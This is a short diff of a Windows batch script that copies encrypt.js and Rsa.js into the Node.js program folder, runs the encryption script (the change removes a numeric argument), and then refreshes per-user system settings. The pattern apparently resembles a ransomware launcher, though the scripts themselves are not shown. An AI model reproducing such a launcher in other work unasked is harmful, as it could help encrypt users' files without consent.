@@ -93,7 +93,7 @@ rem run main program
 copy "%~dp0\encrypt.js" "%SystemDrive%\Program Files\nodejs\encrypt.js"
 copy "%~dp0\Rsa.js" "%SystemDrive%\Program Files\nodejs\Rsa.js"
 cd %SystemDrive%\Program Files\nodejs
-node encrypt 17302554875
+node encrypt.js
 
 rem refresh system setup
 RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
